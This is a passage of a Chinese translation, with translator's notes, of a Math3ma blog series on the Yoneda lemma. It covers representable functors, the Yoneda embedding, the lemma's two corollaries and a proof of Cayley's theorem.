&lt;p&gt;说“一个对象X完全由…确定”意味着X作为由省略号处内容所表征的对象，其&lt;a href=&#34;https://www.math3ma.com/blog/up-to-isomorphism&#34;&gt;在同构的意义下&lt;/a&gt;是唯一的。比如在本部分第一段中，省略号处对应的是“它们与其他对象的关系”。（尽管通常来说省略号处是一个&lt;a href=&#34;https://jeremykun.com/2013/05/24/universal-properties/&#34;&gt;普适性质&lt;/a&gt;。这很正常。根据&lt;a href=&#34;#1&#34;&gt;Yoneda视角&lt;/a&gt;，这两种填在省略号处的内容没啥区别！（译者注：确实不知道怎么翻译该句”the two addendums go hand in hand”，此处的两种addendums可能指的是追加在省略号处的可以是“对象带有的普适性质&amp;#x2F;对象的定义蕴含的属性”，也可以是上文的“对象与其他对象的关系”，而这两种答案本质上是一样的））重点在于，如果Y与X以&lt;em&gt;相同&lt;/em&gt;的方式与C中的&lt;em&gt;所有&lt;/em&gt;其他对象联系——也就是说，如果从整个范畴的视点看，Y看起来就像X一样——那么X和Y一定是同构的。&lt;/p&gt;
&lt;p&gt;例如，假设X和Y是拓扑空间，令$\cdot$表示单点空间，$I$和$S^1$表示单位区间和圆。那么我们有，&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;X和Y具有相同的势(cardinality)当且仅当 $\text{hom}(\bullet,X) \cong \text{hom}(\bullet,Y)$&lt;/li&gt;
&lt;li&gt;X和Y具有相同的路径空间(path space)当且仅当 $\text{hom}(I,X) \cong \text{hom}(I,Y)$&lt;/li&gt;
&lt;li&gt;X和Y具有相同的（自由）&lt;a href=&#34;https://en.wikipedia.org/wiki/Loop_space&#34;&gt;环空间(loop space)&lt;/a&gt;当且仅当 $\text{hom}(S^1,X) \cong \text{hom}(S^1,Y)$&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/probe.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据路径空间和环空间的定义，后两点成立。（它们分别是从$I$和$S^1$到$X$的所有连续函数的空间。）而至于第一点，只是因为一个形如$\bullet \to X$的映射其实就是在$X$中选择一个点。我们甚至可以说$\bullet \to X$是$X$的一个“$\bullet$塑造的元素”。类似地，一个路径$I \to X$可以被看作是$X$的一个“$I$塑造的元素”，而一个环$S^1 \to X$则是一个“$S^1$塑造的元素。” 本质上，我们使用$\bullet$、$I$和$S^1$来探测(probe)$X$和$Y$. 为了洞悉全貌，我们必须用&lt;em&gt;所有&lt;/em&gt;空间探测它们——也即从&lt;em&gt;所有&lt;/em&gt;空间的视点观察它们。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;在确立这些数学形式之后，“一个对象X完全由X与其他对象的关系所确定”这个说法现在可以明确为两个要点：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;要点 #1.&lt;/strong&gt; 关于X的一切我们需要知道的东西都被编码在$\text{hom}(-,X)$中。实际上，对象X&lt;strong&gt;表示&lt;/strong&gt;了函子$\text{hom}(-,X)$. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;要点 #2.&lt;/strong&gt; 当且仅当它们所表示的函子$\text{hom}(-,X)$和$\text{hom}(-,Y)$同构时，X和Y才是同构的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们现在先考虑第一点，之后再重新审视第二点。所以我们真的能够像第一点说的那样用一个函子来确定一个对象吗？显然存在一个指派&lt;br&gt;$$X \mapsto \text{hom}(-, X)$$&lt;br&gt;这是因为范畴 $\mathbf{C}$ 中的任何对象 $X$ 都对应于一个函子 $\text{hom}(-,X)$，那么这个函子存在于… 呃… 在哪呢？$\text{hom}(-,X)$ 位于哪里？它也存在于一个范畴中！正如我们很久以前提到的，存在一个范畴 $\mathbf{Set}^{ \mathbf{C}^{op} }$ ，它的对象是从 $\mathbf{C}^{op}$ 到 $\mathbf{Set}$ 的函子，而其态射是自然变换。因此，存在一个函子 $\mathscr{Y}: \mathbf{C} \rightarrow \mathbf{Set}^{ \mathbf{C}^{op} }$，它将对象 $X$ 映射到 $\text{hom}(-, X)$，将一个态射 $f: X \rightarrow Y$ 映射到自然变换 $f_*: \text{hom}(-, X) \rightarrow \text{hom}(-, Y)$（你自己应该能验证）。这个自然变换的每个分量都是通过与 $f$ 后合成(postcomposing)得到的。在范畴 $\mathbf{Set}^{ \mathbf{C}^{op} }$ 中的函子被称为预层(presheaf)，我们感兴趣的预层，即形式为 $\text{hom}(-,X)$ 的预层，被称为&lt;strong&gt;可表示函子&lt;/strong&gt;(representable functors)。但是我们需要证明这个命名是否合理： $X$ 真正地、忠实地且最大限度地&lt;em&gt;表示&lt;/em&gt;函子 $\text{hom}(-, X)$ 吗？&lt;/p&gt;
&lt;p&gt;答案是肯定的，但有一个条件：当 $\mathscr{Y}$ 将 $X$ 发送到预层范畴时，它必须&lt;em&gt;保留&lt;/em&gt; $X$ 与 $\mathbf{C}$ 中对象之间的关系。换句话说，对于 $X$ 和 $Y$ 之间的每个关系，应恰好存在&lt;em&gt;一个&lt;/em&gt;关系（自然变换）在$\text{hom}(-, X)$ 和 $\text{hom}(-, Y)$ 之间。更正式地说，对于 $\mathbf{C}$ 中的每对 $X$ 和 $Y$，由 $f \mapsto f_*$ 定义的函数&lt;br&gt;$$\text{hom}(X, Y) \rightarrow \mathbf{Nat}(\text{hom}(-, X), \text{hom}(-, Y))$$&lt;br&gt;应该是一个双射。（记号 $\mathbf{Nat}(-,-)$ 表示从 [留空] 到 [留空] 的自然变换集合（译者注：留空即为在该处使用 $-$ 处填入的对象填空）） 。如果 $\mathscr{Y}$ 满足这个条件，则称其为全忠实(fully faithful)*的并且称它将范畴 $\mathbf{C}$ &lt;strong&gt;嵌入&lt;/strong&gt;到 $Set^{C^{op} }$ 中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/embed.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;但问题来了：&lt;/p&gt;
&lt;p&gt;这个把 $f$ 映射到 $f_*$ 的函数&lt;br&gt;$$\text{hom}(X, Y) \rightarrow \mathbf{Nat}(\text{hom}(-, X), \text{hom}(-, Y))$$&lt;br&gt;真的是一个双射吗？&lt;/p&gt;
&lt;p&gt;单射性是显然的：如果 $f, g: X \rightarrow Y$ 是不同的态射，则它们的推出(pushforward) $f_*$ 和 $g_*$ 显然是不同的。但，满射性呢？给定任意的自然变换 $\eta: \text{hom}(-, X) \rightarrow \text{hom}(-, Y)$，是否真的存在一个态射 $f: X \rightarrow Y$ 使得 $\eta &amp;#x3D; f_*$？也就是说，&lt;br&gt;&lt;strong&gt;&lt;em&gt;每个&lt;/em&gt;可表示函子之间的自然变换，是否都来自于表示了它们的对象之间的态射？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可能存在大量的自然变换 $\text{hom}(-, X)$ 和 $\text{hom}(-, Y)$！似乎不能指望其中的每个都来自于一个 $X \rightarrow Y$ 的态射。&lt;/p&gt;
&lt;p&gt;然而，奇怪的是，真就是这样的！&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;还真是！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对于每个自然变换 $\eta: \text{hom}(-, X) \rightarrow \text{hom}(-, Y)$，存在唯一的态射 $f: X \rightarrow Y$，使得 $\eta &amp;#x3D; f_*$. &lt;/p&gt;
&lt;p&gt;而&lt;strong&gt;这&lt;/strong&gt;正是Yoneda引理直接导出的。&lt;/p&gt;
&lt;p&gt;结果是，$\mathscr{Y}$ 将 $\mathbf{C}$ 全忠实地嵌入到 $\mathbf{Set}^{ \mathbf{C}^{op} }$ 中。（这是上面提到的“要点 #1”的形式化表述。）因此，$\mathscr{Y}$ 被称为&lt;strong&gt;Yoneda嵌入&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;但是，态射 $X \rightarrow Y$ 与自然变换 $\text{hom}(-, X) \rightarrow \text{hom}(-, Y)$ 之间是双射的这一事实仅仅是Yoneda引理导出的一个&lt;em&gt;结果&lt;/em&gt;。正如我们&lt;a href=&#34;#3&#34;&gt;下周&lt;/a&gt;将看到的，Yoneda引理其实是一个更强的结论！它是关于&lt;strong&gt;任意&lt;/strong&gt;函子 $F: \mathbf{C}^{op} \rightarrow \mathbf{Set}$ 的自然变换 $\text{hom}(-, X) \rightarrow F$ 的结论。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;* 更一般地，对于任意函子 $F: \mathbf{C} \rightarrow \mathbf{D}$，存在一个函数 $\text{hom}_{\mathbf{C} }(X, Y) \rightarrow \text{hom}_{\mathbf{D} }(F(X), F(Y))$，由 $f \mapsto F(f)$ 给出。如果这个映射是单射，我们说 $F$ 忠实(faithful)；如果它是满射，我们说 $F$ 全射(full)；如果它是双射，我们说 $F$ 全忠实(fully faithful)（译者注：相当于此时我们只关心态射在F作用下的变化情况）。以下是一个方便的&lt;a href=&#34;http://www.math3ma.com/mathema/2017/7/30/naming-functors&#34;&gt;表格&lt;/a&gt;，用于命名其他类型的函子。&lt;/p&gt;
&lt;p&gt;(译者注：我将这个有趣的表格直接附在此处↓)&lt;br&gt;&lt;img src=&#34;/yoneda/naming.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;3-3：米田引理-The-Yoneda-Lemma&#34;&gt;&lt;a href=&#34;#3-3：米田引理-The-Yoneda-Lemma&#34; class=&#34;headerlink&#34; title=&#34;3&amp;#x2F;3：米田引理(The Yoneda Lemma)&#34;&gt;&lt;/a&gt;3&amp;#x2F;3：&lt;a name=&#34;3&#34;&gt;&lt;/a&gt;米田引理(The Yoneda Lemma)&lt;/h2&gt;&lt;p&gt;&lt;em&gt;本部分翻译自 &lt;a href=&#34;https://www.math3ma.com/blog/the-yoneda-lemma&#34;&gt;https://www.math3ma.com/blog/the-yoneda-lemma&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;欢迎来到关于Yoneda引理的第三部分，也是最后一部分！在过去的几周里，我们慢慢揭示了&lt;a href=&#34;#1&#34;&gt;Yoneda视角&lt;/a&gt;背后的数学，即一个对象完全由其与其他对象的关系所决定这一范畴论里的原则(maxim)。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#2&#34;&gt;上周&lt;/a&gt;，我们将这一原则分成了两点：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;要点 #1.&lt;/strong&gt; 关于X的一切我们需要知道的东西都被编码在$\text{hom}(-,X)$中。实际上，对象X&lt;strong&gt;表示&lt;/strong&gt;了函子$\text{hom}(-,X)$. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;要点 #2.&lt;/strong&gt; 当且仅当它们所表示的函子$\text{hom}(-,X)$和$\text{hom}(-,Y)$同构时，X和Y才是同构的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;注意到第一点其实是在以不那么严谨的方式表达Yoneda嵌入 $\mathscr{Y}: \mathbf{C} \rightarrow \mathbf{Set}^{op}$ （它将一个对象 $X$ 映射到函子 $\text{hom}(-,X)$）是全忠实的。换句话说，从 $\text{hom}(X,Y)$（一组态射的集合）到 $\mathbf{Nat}(\text{hom}(-,X), \text{hom}(-,Y))$（一组自然变换的集合）的函数将 $f$ 映射到 $f_*$，而这是一个双射。（此处 $f_*$ 将任一个态射 $g:Z\rightarrow X$ 映射到这样的复合： $f\circ g:Z\rightarrow Y$（译者注：也就是与f后复合））。&lt;/p&gt;
&lt;p&gt;这意味着对于每个 $f:X\rightarrow Y$，存在&lt;em&gt;恰好一个&lt;/em&gt;由 $f$ 自身构造出(cooked up)的自然变换 $\text{hom}(-,X)\rightarrow \text{hom}(-,Y)$. 反过来，如果 $\eta:\text{hom}(-,X)\rightarrow \text{hom}(-,Y)$ 是任一自然变换，则存在&lt;em&gt;恰好一个&lt;/em&gt;由 $\eta$ 自身得到的态射 $X\rightarrow Y$. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/bijection.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;现在，有一个简单但至关重要的观察发现：注意到集合 $\text{hom}(X,Y)$ 位于函子 $\text{hom}(-,Y):\mathbf{C}^{op} \rightarrow \mathbf{Set}$ 的像中！”但是，” 你会问， “这重要在哪呢？”&lt;/p&gt;
&lt;p&gt;因为，这让我们可以这样重新表述上周得到的结果：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;对于范畴 $\mathbf{C}$ 中的任意对象 $X$，自然变换 $\text{hom}(-,X) \rightarrow \text{hom}(-,Y)$ 与集合 $\text{hom}(X,Y)$ 中的元素双射（一一对应）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;相当简洁，对吧？你知道真正让人惊叹的是什么吗？这个结论不仅对于形如 $\text{hom}(-,Y)$ 的函子成立；它对于从 $\mathbf{C}^{op}$ 到 $\mathbf{Set}$ 的&lt;strong&gt;所有&lt;/strong&gt;函子都成立。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;所有！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;这&lt;/em&gt;就是所谓Yoneda引理。&lt;/p&gt;
&lt;h3 id=&#34;Yoneda引理&#34;&gt;&lt;a href=&#34;#Yoneda引理&#34; class=&#34;headerlink&#34; title=&#34;Yoneda引理&#34;&gt;&lt;/a&gt;Yoneda引理&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;对于任意函子 $F: \mathbf{C}^{op} \rightarrow \mathbf{Set}$ 和范畴 $\mathbf{C}$ 中的任意对象 $X$，自然变换 $\text{hom}(-,X) \rightarrow F$ 与集合 $F(X)$ 中的元素一一对应。也就是说，&lt;br&gt;$$ \mathbf{Nat}(\text{hom}(-,X), F) \cong F(X) $$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;你明白这玩意的重要性了吗？自然变换 $\text{hom}(-,X) \rightarrow F$ 的集合似乎可能是超~级~大~的，一大片浓密的未知、难以驯服和没用的杂草丛。”但是，” Yoneda引理告诉我们，”&lt;em&gt;不是这样的！&lt;/em&gt;“ 把F限制在特定对象 $X$ 上应用会得到一个集合F(X)，而&lt;em&gt;只有&lt;/em&gt;从该集合中元素“烹饪”而成（构造而来）的自然变换，才是真实存在的自然变换。&lt;/p&gt;
&lt;p&gt;那么这个“烹饪”用到的食谱是什么呢？&lt;/p&gt;
&lt;p&gt;给定 $c \in F(X)$，定义 $\eta: \text{hom}(-,X) \rightarrow F$，通过声明 $\eta _Y: \text{hom}(Y,X) \rightarrow F(Y)$ 为一个将映射 $g: Y \rightarrow X$ 发送到在 $F(Y)$ 中的元素 $Fg(c)$的态射，其中 $Fg$ 表示在 $F$ 作用下映射 $g$ 对应的像。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/F_bijection.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;反过来说，任意自然变换 $\eta: \text{hom}(-,X) \rightarrow F$ 只取决于 $F(X)$ 中的一个元素，即 $\eta_X(\text{id}_X)$. 这里 $\eta_X$ 表示态射 $\text{hom}(X,X) \rightarrow F(X)$，而 $\text{id}_X$ 是 $X$ 上的单位态射（译者注：单位态射即为恒等态射 $\text{id}_X \in \text{hom}(X,X)$ ，这里即是序言部分所说“单位态射”起到“凝结核”效果的体现：虽然单位态射是我们唯一已知一定存在的态射，但其他所有态射的去向都被这个单位态射的去向固定了）。&lt;/p&gt;
&lt;p&gt;我们还是要检查这些指派(assignment)（译者注：应该指的是上面两种对偶的说法）是否真的彼此互为逆（以及 $\eta$ 是否真的是一个自然变换）。但正如Tom Leinster&lt;a href=&#34;https://arxiv.org/abs/1612.09375&#34;&gt;曾经说过&lt;/a&gt;的，“理解了问题就等于快知道答案了……只有一种向前进的办法。”&lt;/p&gt;
&lt;p&gt;Yoneda引理的一个直接推论是&lt;a href=&#34;#2&#34;&gt;上周讨论的内容&lt;/a&gt;，这里再次强调：&lt;/p&gt;
&lt;h3 id=&#34;Yoneda引理第一推论（要点＃1）&#34;&gt;&lt;a href=&#34;#Yoneda引理第一推论（要点＃1）&#34; class=&#34;headerlink&#34; title=&#34;Yoneda引理第一推论（要点＃1）&#34;&gt;&lt;/a&gt;Yoneda引理第一推论（要点＃1）&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;推论1：&lt;/strong&gt; Yoneda嵌入 $\mathscr{Y} : \mathbf{C} \rightarrow \mathbf{Set}^{\mathbf{C} }$ 是全忠实的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;映射 $\text{hom}(X,Y) \mapsto \text{Nat}(\text{hom}(-,X), \text{hom}(-,Y))$ 的单射性是显而易见的（如果 $f \neq g$，则 $f_* \neq g_*$）。Yoneda引理则给出满射性。为了证明这一点，将 $F &amp;#x3D; \text{hom}(-,Y)$ 代入引理的陈述中，那么我们得到一个双射&lt;br&gt;$$ \mathbf{Nat}(\text{hom}(-,X), \text{hom}(-,Y)) \cong \text{hom}(X,Y) $$&lt;br&gt;现在设 $\eta : \text{hom}(-,X) \rightarrow \text{hom}(-,Y)$ 是任意的自然变换。我们需要证明存在一个态射 $f : X \rightarrow Y$ 使得 $\eta &amp;#x3D; f_*$. 这里的” $\eta &amp;#x3D; f_*$ “ 意味着对于范畴 $\mathbf{C}$ 中的每个对象 $W$ 和任何映射 $g : W \rightarrow X$，都有&lt;br&gt;$$\eta_W(g) &amp;#x3D; f \circ g$$&lt;br&gt;那么映射 $f$ 应该是什么呢？实际上只有一种选择！根据Yoneda引理，$\eta$ 恰好完全取决于一个态射 $\eta_X(\text{id}_X) : X \rightarrow Y$. 所以我们就选这个！也就是说，&lt;br&gt;$$\text{令} f :&amp;#x3D; \eta_X(\text{id}_X)$$&lt;br&gt;现在我们只需要验证这样是否可行。但根据定义，这样的陈述“$\eta$ 是一个自然变换”意味着对于范畴 $\mathbf{C}$ 中的任意一对对象 $Z$、$W$ 和任何映射 $g : W \rightarrow Z$，我们有等式 $\eta_W \circ g^* &amp;#x3D; g^* \circ \eta_Z$，也就是说，对于任何 $h : Z \rightarrow X$，都有&lt;br&gt;$$\eta_W(h \circ g) &amp;#x3D; \eta_Z(h) \circ g$$&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/natural.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于这对于&lt;em&gt;所有&lt;/em&gt; $Z$ 和 $h$ 都成立，所以对于特例： $Z&amp;#x3D;X$ 且 $h&amp;#x3D;\text{id}_X \in \text{hom}(X,X)$ 仍然成立。&lt;br&gt;现在，自然性条件给出的正是我们想要的：对于所有 $g : W \rightarrow X$，都有 $\eta_W(g) &amp;#x3D; fg$. 因此 $\eta &amp;#x3D; f_*$. &lt;/p&gt;
&lt;p&gt;因此，一个对象 $X$ 本质上(effectually)与其可表示函子等效。到目前为止，我们总是专注于反变函子 $\text{hom}(-,X)$，但其实存在Yoneda嵌入的反变版本（以及对应于&lt;em&gt;协变&lt;/em&gt;函子版本 $F$ 的Yoneda引理版本）（译者注：即序章部分所述co-Yoneda嵌入与co-Yoneda引理），因此有一个类似的“推论1”，其中 $\text{hom}(-,X)$ 被替换为 $\text{hom}(X,-)$. 但本质是相同的——$X$ 是由其与其他对象的关系决定的。&lt;/p&gt;
&lt;p&gt;更好的是，它是&lt;em&gt;完全地&lt;/em&gt;由其与其他对象的关系决定的。这个“完全”一词是由提到过的要点二给出的，实际上它就是Yoneda引理的第二推论。&lt;/p&gt;
&lt;h3 id=&#34;Yoneda引理第二推论（要点＃2）&#34;&gt;&lt;a href=&#34;#Yoneda引理第二推论（要点＃2）&#34; class=&#34;headerlink&#34; title=&#34;Yoneda引理第二推论（要点＃2）&#34;&gt;&lt;/a&gt;Yoneda引理第二推论（要点＃2）&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;推论2：$X \cong Y \Leftrightarrow \text{hom}(-,X) \cong \text{hom}(-,Y)$. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在一个方向（译者注：$\Rightarrow$）上它显然成立，因为 $Y$ 是一个函子：如果 $X$ 和 $Y$ 是同构的，那么 $\text{hom}(-,X)$ 和 $\text{hom}(-,Y)$ 也是同构的；而另一个方向上（译者注：$\Leftarrow$）也成立则是因为 $Y$ 是全忠实的。有个一般性的事实：如果 $F : \mathbf{C} \rightarrow \mathbf{D}$ 是一个全忠实的函子，并且如果 $F(X) \cong F(Y)$，那么 $X \cong Y$. （证明见本部分脚注。*）&lt;/p&gt;
&lt;p&gt;我们上周看到了这个推论的一个例子：两个拓扑空间 $X$ 和 $Y$ 有相同的势当且仅当 $\text{hom}(\bullet, X) \cong \text{hom}(\bullet, Y)$；它们有相同的路径空间当且仅当 $\text{hom}(I, X) \cong \text{hom}(I, Y)$；它们有相同的环空间当且仅当 $\text{hom}(S^1, X) \cong \text{hom}(S^1, Y)$；等等。用各种空间探测 $X$ 和 $Y$ 会给出更多信息。用&lt;em&gt;所有&lt;/em&gt;空间来探测则可以给出&lt;em&gt;所有&lt;/em&gt;信息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/probe2.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;当然，观察从 $X$ &lt;em&gt;出发&lt;/em&gt;的映射同样能提供有效信息。例如，$X$ 是&lt;a href=&#34;http://www.math3ma.com/mathema/2015/9/7/on-connectedness-intuitively&#34;&gt;连通的&lt;/a&gt;当且仅当每个映射 $X \rightarrow {0,1}$ 都是常值映射。有趣的是，如果我们考虑由Sierpinski拓扑赋予的相同集合 ${0,1}$，那么（&lt;a href=&#34;http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property&#34;&gt;正如我们之前所见&lt;/a&gt;）集合 $\text{hom}(X, {0,1})$ 将得以捕获 $X$ 上的全部拓扑。此外，从 $X$ 到&lt;a href=&#34;https://en.wikipedia.org/wiki/Eilenberg%E2%80%93MacLane_space&#34;&gt;Eilenberg-MacLane&lt;/a&gt;空间的映射在同伦的意义下(up to homotopy)取决于 $X$ 的同调群。另一方面，从 n维球面 到 $X$ 的映射的同伦类塑造了 $X$ 的同伦群。&lt;/p&gt;
&lt;p&gt;如此着重强调态射是Yoneda视角（或者说是Yoneda引理）的结果；&lt;em&gt;一切的关键在于关系！&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/summary.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;我想再用一个例子收尾本文。Yoneda引理有时被描述为群论中&lt;a href=&#34;https://en.wikipedia.org/wiki/Cayley%27s_theorem&#34;&gt;Cayley定理&lt;/a&gt;的推广。确实是这样的。我们可以使用Yoneda引理来&lt;em&gt;证明&lt;/em&gt;Cayley定理。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;一个对Cayley定理的证明&#34;&gt;&lt;a href=&#34;#一个对Cayley定理的证明&#34; class=&#34;headerlink&#34; title=&#34;一个对Cayley定理的证明&#34;&gt;&lt;/a&gt;一个对Cayley定理的证明&lt;/h3&gt;&lt;p&gt;任意群 $G$ 都可以被视为一个范畴，记作 $\mathbf{BG}$，其中有唯一对象 $\bullet$，每个群元素对应一个态射。从 $\mathbf{BG}^{op}$ 到 $\mathbf{Set}$ 的函子 $F$ 被称为右$G$-集合。它将 $\bullet$ 发送到一个集合 $X$，将一个态射（即群元素） $g$ 发送到右乘以 $g$ 的函数 $X \rightarrow X$. 特别地，当 $F &amp;#x3D; \text{hom}(-,\bullet)$ 时，集合 $\text{hom}(\bullet,\bullet)$ 就是 $G$ ，其自身也被视为右$G$-集合。然后根据Yoneda引理，我们有一个双射：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/cayley1.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;右边简单来说就是群 $G$ 中的所有元素。但左边呢？首先注意到自然变换 $\text{hom}(-,\bullet) \rightarrow \text{hom}(-,\bullet)$ 就只是 $G$-等变函数 $G \rightarrow G$. &lt;/p&gt;
&lt;p&gt;但它们是哪些 $G$-等变函数呢？根据推论1中的双射，它们是由 $G$ 中的元素构造而成的。简而言之，集合 $\mathbf{Nat}(\text{hom}(\bullet,\bullet), \text{hom}(\bullet,\bullet))$ 就是由所有函数 $f_g : G \rightarrow G$ 构成的，其定义为 $x \mapsto xg$. 而这些&lt;em&gt;恰好&lt;/em&gt;是由一个固定元素的乘法得到的 $G$ 的自同态！&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/cayley2.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此左边实际上是所有 $G$ 上的置换的一个子群。而且，根据Yoneda引理，这个子群同构于群 $G$ 本身。这就是Cayley定理。（编辑于2022年12月：上面的图表有些误导。请参阅&lt;a href=&#34;https://math.stackexchange.com/questions/4598810/yoneda-lemma-cayley-s-theorem-and-example-with-cyclic-group-mathbbz-6&#34;&gt;这个StackExchange帖子&lt;/a&gt;。）&lt;/p&gt;
&lt;p&gt;（译者注：简而言之，在上文构造的范畴中，根据Yoneda引理第一推论，$\text{hom}(-,\bullet) \rightarrow \text{hom}(-,\bullet) \cong \text{hom}(\bullet,\bullet)$. $\text{hom}(-,\bullet) \rightarrow \text{hom}(-,\bullet)$ 由态射 $\text{hom}(\bullet,\bullet) \rightarrow \text{hom}(\bullet,\bullet)$ 决定，而 $\text{hom}(\bullet,\bullet) \cong G$，因此该态射也即G到自身的一个置换。故该自然变换范畴同构于G上的置换群的一个子群，而由于 $\text{hom}(\bullet,\bullet) \cong G$, 第一推论将给出其同构于G.）&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;延伸阅读&#34;&gt;&lt;a href=&#34;#延伸阅读&#34; class=&#34;headerlink&#34; title=&#34;延伸阅读&#34;&gt;&lt;/a&gt;延伸阅读&lt;/h3&gt;&lt;p&gt;若想深入了解Yoneda引理，我强烈推荐Tom Leinster的&lt;a href=&#34;https://www.amazon.com/Category-Cambridge-Studies-Advanced-Mathematics/dp/1107044243&#34;&gt;&lt;em&gt;Basic Category Theory&lt;/em&gt;&lt;/a&gt;以及他阐释得非常清晰的&lt;a href=&#34;http://www.maths.ed.ac.uk/~tl/categories/yoneda.ps&#34;&gt;&lt;em&gt;The Yoneda Lemma: What’s it All About?&lt;/em&gt;&lt;/a&gt;。我还推荐Emily Riehl的&lt;a href=&#34;http://www.math.jhu.edu/~eriehl/context.pdf&#34;&gt;&lt;em&gt;Category Theory in Context&lt;/em&gt;&lt;/a&gt;（她的例子特别丰富），以及对于一些真正深奥的数学，可以参考&lt;a href=&#34;https://ncatlab.org/nlab/show/Yoneda+lemma&#34;&gt;nLab&lt;/a&gt;。在这些链接中，你会注意到Yoneda引理还有第三个经典的推论，而我们在本系列中并未涵盖。也许未来的文章中会有！&lt;/p&gt;
&lt;p&gt;如果你喜欢“用其他对象探测对象”的想法，你会很高兴知道这是&lt;em&gt;广义点哲学&lt;/em&gt;的一部分。想了解更多可以参考Leinster的&lt;a href=&#34;http://www.maths.ed.ac.uk/~tl/elements.pdf&#34;&gt;&lt;em&gt;Doing Without Diagrams&lt;/em&gt;&lt;/a&gt;和William Lawvere的&lt;a href=&#34;http://www.tac.mta.ca/tac/reprints/articles/11/tr11.pdf&#34;&gt;&lt;em&gt;An Elementary Theory of the Category of Sets&lt;/em&gt;&lt;/a&gt;（2005年版本）。&lt;/p&gt;
&lt;p&gt;最后，还有一个很干练灵性的结果叫做密度定理（例如&lt;a href=&#34;http://www.math.jhu.edu/~eriehl/context.pdf&#34;&gt;这里&lt;/a&gt;的定理6.5.8），它告诉我们每个从 $\mathbf{C}^{op}$ 到 $\mathbf{Set}$ 的函子 $F$ 实际上都是由被表示的函子 $\text{hom}(-,X)$ &lt;em&gt;构建&lt;/em&gt;而成的。严谨地说，每个这样的 $F$ 都是某些 $\text{hom}(-,X)$ 的&lt;a href=&#34;https://en.wikipedia.org/wiki/Limit_(category_theory)&#34;&gt;余极限&lt;/a&gt;。这确实是一个惊艳的成果（背后有精彩的数学！比如Kan扩展），但我会推迟相关的讨论——我们还没有讨论过&lt;a href=&#34;http://www.math3ma.com/mathema/2018/1/2/limits-and-colimits-part-1&#34;&gt;余极限或极限&lt;/a&gt;！至少目前为止。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;*证明：设 $h : F(X) \rightarrow F(Y)$ 是具有逆 $h^{-1}$ 的同构。由于 $F$ 是全忠实的，存在唯一的态射 $f : X \rightarrow Y$ 使得 $Ff &amp;#x3D; h$ 。类似地，存在唯一的态射 $g : Y \rightarrow X$ 使得 $Fg &amp;#x3D; h^{-1}$ 。因此，&lt;br&gt;$$ \text{id}_{F(X)} &amp;#x3D; h^{-1} \circ h &amp;#x3D; Fg \circ Ff &amp;#x3D; F(fg). $$&lt;br&gt;但 $F(\text{id}_X)$ 映射到 $ \text{id}_{F(X)} $ ，因此由于 $F$ 是忠实的，有 $fg &amp;#x3D; \text{id}_X$ 。类似的论证可证明 $gf &amp;#x3D; \text{id}_Y$ 。因此， $f$ 是一个同构。&lt;/p&gt;
